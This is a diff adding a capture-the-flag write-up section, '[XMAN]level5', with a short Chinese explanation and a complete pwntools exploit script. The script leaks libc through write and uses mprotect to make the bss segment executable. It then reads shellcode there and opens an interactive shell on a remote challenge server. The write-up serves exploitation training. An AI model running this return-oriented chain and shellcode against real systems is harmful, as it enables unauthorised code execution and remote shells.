@@ -551,7 +551,83 @@
 
    
 
-* 
+* #### [XMAN]level5
 
+   假设system和execve函数被禁用 
 
+   ```c
+   //mprotect() 
+   #include <unistd.h>
+   #include <sys/mmap.h>
+   int mprotect(const void *start, size_t len, int prot);
+   
+   /*
+   把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。
+   */
+   ```
+
+   先通过write泄露libc，然后调用mprotect()把bss段权限设为可读可写可执行（7），再调用read()在bss段写入shellcode，返回到bss段执行shellcode
+
+   ```python
+   from pwn import *
+   import sys
+   r = remote('pwn2.jarvisoj.com', 9884)
+   elf = ELF('./level3_x64')
+   libc = ELF('./libc-2.19.so')
+   context.binary = "./level3_x64"
+   
+   shellcode = asm(shellcraft.sh())
+   padding = 'a' * (0x80 + 0x8)
+   pwn_addr = 0x4005E6
+   
+   write_plt = elf.plt['write']
+   write_got = elf.got['write']
+   write_libc =  libc.symbols['write']
+   
+   read_plt = elf.plt['read']
+   
+   mprotect_libc = libc.symbols['mprotect']
+   
+   pop_rdi_ret = 0x4006b3
+   pop_rsi_p_r_ret = 0x4006b1
+   
+   payload = padding
+   payload += p64(pop_rdi_ret) + p64(1)
+   payload += p64(pop_rsi_p_r_ret) + p64(write_got) + p64(8)
+   payload += p64(write_plt)
+   payload += p64(pwn_addr)
+   
+   
+   r.recvuntil('Input:\n')
+   r.sendline(payload)
+   leak_addr = u64(r.recv(8))
+   
+   libc_base = leak_addr - write_libc
+   mprotect = libc_base + libc.symbols['mprotect']
+   pop_rsi = libc_base + 0x24885
+   pop_rdx = libc_base + 0x1B8E
+   
+   
+   payload2 = padding + p64(pop_rdi_ret)
+   payload2 += p64(0x600000) + p64(pop_rsi)
+   payload2 += p64(0x10000) + p64(pop_rdx)
+   payload2 += p64(7) + p64(mprotect) + p64(pwn_addr)
+   r.recvuntil('Input:\n')
+   r.sendline(payload2)
+   
+   bss = elf.bss()
+   
+   payload3 = padding + p64(pop_rdi_ret)
+   payload3 += p64(0) + p64(pop_rsi)
+   payload3 += p64(bss) + p64(pop_rdx)
+   payload3 += p64(0x100) + p64(read_plt) + p64(bss)
+   r.recvuntil('Input:\n')
+   r.sendline(payload3)
+   r.send(shellcode)
+   
+   r.interactive()
+   
+   ```
+
+   
 
